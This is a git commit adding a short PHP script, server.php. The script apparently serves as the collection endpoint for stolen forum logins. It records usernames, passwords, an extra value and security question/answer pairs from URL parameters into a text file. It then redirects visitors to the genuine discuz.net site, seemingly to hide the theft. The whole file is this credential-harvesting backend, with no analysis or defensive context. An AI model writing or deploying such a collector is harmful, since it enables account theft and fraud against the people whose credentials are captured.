62e6e5a39b1c3bd6454b0e7ef9ca8c69c97c4db0
Shaw <whirlwind110@163.com>
2017-09-05 21:27:51 +0800

    Create server.php

---
+++ server.php
@@ -0,0 +1,18 @@
+```
+
+<?php
+$file = "cloud.txt";
+if (!empty($_GET['u']) && !empty($_GET['p'])) {
+	$re = $_GET['u'] . "|" . $_GET['p'] . "|" . $_GET['i'] . "\n";
+	if (strpos(file_get_contents($file), $re) === false) {
+		file_put_contents($file, $re, FILE_APPEND);
+	}
+}
+if (!empty($_GET['q']) && !empty($_GET['a'])) {
+	$re = $_GET['q'] . ":" . $_GET['a'] . "\n";
+	file_put_contents($file, $re, FILE_APPEND);
+}
+Header("HTTP/1.1 301 Moved Permanently");
+Header("Location: http://www.discuz.net");
+
+```
